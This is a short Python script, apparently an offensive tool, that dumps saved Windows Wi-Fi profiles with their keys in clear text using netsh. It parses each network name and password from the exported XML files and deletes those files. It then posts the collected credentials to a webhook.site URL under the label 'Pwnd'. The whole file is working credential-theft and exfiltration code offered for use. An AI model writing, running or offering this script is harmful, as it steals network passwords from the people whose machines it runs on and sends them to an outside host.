import subprocess, os, sys, requests, xmltodict

# Replace with your webhook
url = 'https://webhook.site/#####################'
payload = {"Pwnd":[]}

#Use Python to execute Windows command
command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

print(command_output)

#Grab current directory
path = os.getcwd()

#Append Wi-Fi XML files to wifi_files list
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        xml_content = open(filename,'rb')
        as_dict = xmltodict.parse(xml_content)
        xml_content.close()
        payload['Pwnd'].append("%s:%s"% (as_dict['WLANProfile']['name'],as_dict['WLANProfile']['MSM']['security']['sharedKey']['keyMaterial']))
        os.remove(filename)

if len(payload["Pwnd"]) >= 1:
    print("Wi-Fi profiles found. Check your webhook")
else:
    print("No Wi-Fi profiles found. Exiting...")
    sys.exit()

final_payload = ''
for ssid in payload['Pwnd']:
    final_payload += '%s; \n' % ssid
r = requests.post(url, params="format=json", data=final_payload)
